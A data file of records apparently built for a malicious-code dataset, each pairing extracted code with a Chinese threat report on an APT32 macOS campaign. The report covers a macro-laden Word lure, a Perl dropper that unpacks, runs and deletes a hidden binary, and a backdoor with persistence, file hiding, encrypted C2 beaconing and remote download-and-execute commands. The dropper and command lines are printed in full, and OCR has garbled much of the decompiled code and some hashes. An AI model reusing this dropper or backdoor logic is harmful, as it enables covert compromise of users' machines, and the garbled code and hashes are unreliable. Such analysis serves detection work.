{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "system(\"unzip \". $pathFile . \" -d \". $pathFolderFile);\nsystem(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");\nmove(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");\nsystem(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");\nsystem(\"rm -Rf /tmp/system\");\nsystem(\"rm /tmp/modern\");", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "system(\"unzip\".$pathFile.\"-d\".$pathFolderFile);system(\"chmod+x\\\"\".$pathFolderFile.\"/word/theme/theme0.xml\\\"\");move(\"$pathFolderFile/word/theme/theme0.xml\",\"$pathFolderFile/word/theme/syslogd\");system(\"\\\"$pathFolderFile/word/theme/syslogd\\\"&\");system(\"rm-Rf/tmp/system\");system(\"rm/tmp/modern\");", "hash_code": "88104f5bc1fbd47adc0654fbc4e43341c1be0993889d8fc93daafa406f4a7241", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "setStartup();\nremove(buffer);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; 